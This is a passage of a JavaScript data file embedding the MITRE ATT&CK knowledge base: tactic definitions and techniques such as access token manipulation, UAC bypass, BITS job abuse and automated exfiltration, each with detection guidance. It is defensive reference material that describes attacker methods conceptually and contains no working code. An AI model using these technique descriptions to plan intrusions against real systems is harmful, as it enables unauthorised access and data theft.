define(function() {
    return {
        "tactics": [
            {
                "id": "TA0043",
                "url": "https://attack.mitre.org/tactics/TA0043",
                "name": "Reconnaissance",
                "short_name": "reconnaissance",
                "description": "The adversary is trying to gather information they can use to plan future operations.\n\nReconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts."
            },
            {
                "id": "TA0042",
                "url": "https://attack.mitre.org/tactics/TA0042",
                "name": "Resource Development",
                "short_name": "resource-development",
                "description": "The adversary is trying to establish resources they can use to support operations.\n\nResource Development consists of techniques that involve adversaries creating, purchasing, or compromising/stealing resources that can be used to support targeting. Such resources include infrastructure, accounts, or capabilities. These resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using purchased domains to support Command and Control, email accounts for phishing as a part of Initial Access, or stealing code signing certificates to help with Defense Evasion."
            },
        {
                "id": "TA0001",
                "url": "https://attack.mitre.org/tactics/TA0001",
                "name": "Initial Access",
                "short_name": "initial-access",
                "description": "The adversary is trying to get into your network.\n\nInitial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords."
            },
        {
                "id": "TA0002",
                "url": "https://attack.mitre.org/tactics/TA0002",
                "name": "Execution",
                "short_name": "execution",
                "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. "
            },
        {
                "id": "TA0003",
                "url": "https://attack.mitre.org/tactics/TA0003",
                "name": "Persistence",
                "short_name": "persistence",
                "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. "
            },
            {
                "id": "TA0004",
                "url": "https://attack.mitre.org/tactics/TA0004",
                "name": "Privilege Escalation",
                "short_name": "privilege-escalation",
                "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  "
            },
        {
                "id": "TA0005",
                "url": "https://attack.mitre.org/tactics/TA0005",
                "name": "Defense Evasion",
                "short_name": "defense-evasion",
                "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics� techniques are cross-listed here when those techniques include the added benefit of subverting defenses. "
            },
        {
                "id": "TA0006",
                "url": "https://attack.mitre.org/tactics/TA0006",
                "name": "Credential Access",
                "short_name": "credential-access",
                "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals."
            },
            {
                "id": "TA0007",
                "url": "https://attack.mitre.org/tactics/TA0007",
                "name": "Discovery",
                "short_name": "discovery",
                "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what�s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. "
            },
            {
                "id": "TA0008",
                "url": "https://attack.mitre.org/tactics/TA0008",
                "name": "Lateral Movement",
                "short_name": "lateral-movement",
                "description": "The adversary is trying to move through your environment.\n\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier. "
            },
        {
                "id": "TA0009",
                "url": "https://attack.mitre.org/tactics/TA0009",
                "name": "Collection",
                "short_name": "collection",
                "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input."
            },
            {
                "id": "TA0011",
                "url": "https://attack.mitre.org/tactics/TA0011",
                "name": "Command and Control",
                "short_name": "command-and-control",
                "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim�s network structure and defenses."
            },
            {
                "id": "TA0010",
                "url": "https://attack.mitre.org/tactics/TA0010",
                "name": "Exfiltration",
                "short_name": "exfiltration",
                "description": "The adversary is trying to steal data.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they�ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission."
            },
            {
                "id": "TA0040",
                "url": "https://attack.mitre.org/tactics/TA0040",
                "name": "Impact",
                "short_name": "impact",
                "description": "The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries� goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach."
            },
        ],
        "techniques": [
            {
                "id": "T1548",
                "name": "Abuse Elevation Control Mechanism",
                "description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.",
                "url": "https://attack.mitre.org/techniques/T1548",
                "data_sources": [
                    "Process: Process Metadata",
                    "Process: Process Creation",
                    "Windows Registry: Windows Registry Key Modification",
                    "Command: Command Execution",
                    "File: File Metadata",
                    "File: File Modification",
                    "Process: OS API Execution"
                ],
                "detection": "Monitor the file system for files that have the setuid or setgid bits set. Also look for any process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo).\n\nConsider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.\n\nOn Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.\n\nThere are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes.",
                "permissions": [
                    "Administrator",
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "privilege-escalation",
                    "defense-evasion"
                ]
            },
            {
                "id": "T1134",
                "name": "Access Token Manipulation",
                "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
                "url": "https://attack.mitre.org/techniques/T1134",
                "data_sources": [
                    "Process: Process Creation",
                    "Process: Process Metadata",
                    "Process: OS API Execution",
                    "User Account: User Account Metadata",
                    "Active Directory: Active Directory Object Modification",
                    "Command: Command Execution"
                ],
                "detection": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code> (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code>(Citation: Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code>(Citation: Microsoft ImpersonateLoggedOnUser)). Please see the referenced Windows API pages for more information.\n\nQuery systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account.(Citation: BlackHat Atkinson Winchester Token Manipulation)\n\nLook for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.",
                "permissions": [
                    "User",
                    "Administrator"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion",
                    "privilege-escalation"
                ]
            },
            {
                "id": "T1531",
                "name": "Account Access Removal",
                "description": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.\n\nAdversaries may also subsequently log off and/or reboot boxes to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)",
                "url": "https://attack.mitre.org/techniques/T1531",
                "data_sources": [
                    "User Account: User Account Deletion",
                    "User Account: User Account Modification",
                    "Active Directory: Active Directory Object Modification"
                ],
                "detection": "Use process monitoring to monitor the execution and command line parameters of binaries involved in deleting accounts or changing passwords, such as use of [Net](https://attack.mitre.org/software/S0039). Windows event logs may also designate activity associated with an adversary's attempt to remove access to an account:\n\n* Event ID 4723 - An attempt was made to change an account's password\n* Event ID 4724 - An attempt was made to reset an account's password\n* Event ID 4726 - A user account was deleted\n* Event ID 4740 - A user account was locked out\n\nAlerting on [Net](https://attack.mitre.org/software/S0039) and these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.",
                "permissions": [
                    "User",
                    "Administrator",
                    "root",
                    "SYSTEM"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1087",
                "name": "Account Discovery",
                "description": "Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.",
                "url": "https://attack.mitre.org/techniques/T1087",
                "data_sources": [
                    "User Account: User Account Metadata",
                    "Command: Command Execution",
                    "Process: Process Creation",
                    "File: File Access"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1098",
                "name": "Account Manipulation",
                "description": "Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.",
                "url": "https://attack.mitre.org/techniques/T1098",
                "data_sources": [
                    "File: File Modification",
                    "Command: Command Execution",
                    "Process: Process Creation",
                    "Group: Group Modification",
                    "User Account: User Account Modification",
                    "Active Directory: Active Directory Object Modification"
                ],
                "detection": "Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.(Citation: Microsoft User Modified Event)(Citation: Microsoft Security Event 4670)(Citation: Microsoft Security Event 4670) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.\n\nMonitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts.",
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ],
                "tactics": [
                    "persistence"
                ]
            },
            {
                "id": "T1583",
                "name": "Acquire Infrastructure",
                "description": "Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows an adversary to stage, launch, and execute an operation. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
                "url": "https://attack.mitre.org/techniques/T1583",
                "detection": "Consider use of services that may aid in tracking of newly acquired infrastructure, such as WHOIS databases for domain registration information. Much of this activity may take place outside the visibility of the target organization, making detection of this behavior difficult.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "resource-development"
                ]
            },
            {
                "id": "T1595",
                "name": "Active Scanning",
                "description": "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\n\nAdversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
                "url": "https://attack.mitre.org/techniques/T1595",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "reconnaissance"
                ]
            },
            {
                "id": "T1071",
                "name": "Application Layer Protocol",
                "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "url": "https://attack.mitre.org/techniques/T1071",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1010",
                "name": "Application Window Discovery",
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.",
                "url": "https://attack.mitre.org/techniques/T1010",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Process: OS API Execution"
                ],
                "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "discovery"
                ]
            },
            {
                "id": "T1560",
                "name": "Archive Collected Data",
                "description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
                "url": "https://attack.mitre.org/techniques/T1560",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "File: File Creation",
                    "Script: Script Execution"
                ],
                "detection": "Archival software and archived files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1123",
                "name": "Audio Capture",
                "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
                "url": "https://attack.mitre.org/techniques/T1123",
                "data_sources": [
                    "Process: OS API Execution",
                    "Command: Command Execution"
                ],
                "detection": "Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1119",
                "name": "Automated Collection",
                "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files.",
                "url": "https://attack.mitre.org/techniques/T1119",
                "data_sources": [
                    "File: File Access",
                    "Command: Command Execution",
                    "Script: Script Execution"
                ],
                "detection": "Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [Data Staged](https://attack.mitre.org/techniques/T1074). As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1020",
                "name": "Automated Exfiltration",
                "description": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
                "url": "https://attack.mitre.org/techniques/T1020",
                "data_sources": [
                    "Command: Command Execution",
                    "Script: Script Execution",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content",
                    "File: File Access"
                ],
                "detection": "Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ],
                "tactics": [
                    "exfiltration"
                ]
            },
            {
                "id": "T1197",
                "name": "BITS Jobs",
                "description": "Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)\n\nAdversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)",
                "url": "https://attack.mitre.org/techniques/T1197",
                "data_sources": [
                    "Process: Process Creation",
                    "Network Traffic: Network Connection Creation",
                    "Service: Service Metadata",
                    "Command: Command Execution"
                ],
                "detection": "BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>).(Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (<code>bitsadmin /list /allusers /verbose</code>).(Citation: Microsoft BITS)\n\nMonitor usage of the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (especially the �Transfer�, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)(Citation: Microsoft BITS) Admin logs, PowerShell logs, and the Windows Event log for BITS activity.(Citation: Elastic - Hunting for Persistence Part 1) Also consider investigating more detailed information about jobs by parsing the BITS job database.(Citation: CTU BITS Malware June 2016)\n\nMonitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).(Citation: Microsoft BITS)",
                "permissions": [
                    "User",
                    "Administrator",
                    "SYSTEM"
                ],
                "platforms": [
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion",
                    "persistence"
                ]
            },
            {
                "id": "T1547",
                "name": "Boot or Logon Autostart Execution",
                "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming)� These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
                "url": "https://attack.mitre.org/techniques/T1547",
                "data_sources": [
                    "File: File Creation",
                    "Windows Registry: Windows Registry Key Creation",
                    "Windows Registry: Windows Registry Key Modification",
                    "File: File Modification",
                    "Command: Command Execution",
                    "Process: Process Creation",
                    "Module: Module Load",
                    "Kernel: Kernel Module Load",
                    "Driver: Driver Load",
                    "Process: OS API Execution"
                ],
                "detection": "Monitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence.(Citation: TechNet Autoruns)  Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. \n\nSuspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.\n\nMonitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation.",
                "permissions": [
                    "User",
                    "Administrator",
                    "root"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "persistence",
                    "privilege-escalation"
                ]
            },
            {
                "id": "T1037",
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "url": "https://attack.mitre.org/techniques/T1037",
                "data_sources": [
                    "Windows Registry: Windows Registry Key Creation",
                    "Process: Process Creation",
                    "Command: Command Execution",
                    "Active Directory: Active Directory Object Modification",
                    "File: File Creation",
                    "File: File Modification"
                ],
                "detection": "Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.",
                "platforms": [
                    "macOS",
                    "Windows",
                    "Linux"
                ],
                "tactics": [
                    "persistence",
                    "privilege-escalation"
                ]
            },
            {
                "id": "T1217",
                "name": "Browser Bookmark Discovery",
